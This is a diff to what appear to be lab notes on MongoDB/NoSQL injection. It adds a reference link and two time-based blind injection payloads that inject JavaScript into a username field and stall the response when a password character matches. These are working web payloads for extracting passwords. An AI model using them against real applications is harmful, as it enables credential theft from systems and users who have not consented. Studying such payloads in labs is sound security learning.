@@ -26,6 +26,7 @@
 |$regex | Selects documents where values match a specified regular expression.|
 | $nin  | not in an array |
 
+- [More examples](https://www.w3schools.com/mongodb/mongodb_query_operators.php)
 - SOlving the lab with `$nin`-:
 
 ```json
@@ -182,5 +183,17 @@ async def main():
 if __name__ == "__main__":
     asyncio.run(main())
 ```
+- Usage-:
 
-- 
+- Time based injection exfiltration-:
+
+```
+admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
+```
+- Payload 2-:
+
+```
+admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
+```
+
+--------------------
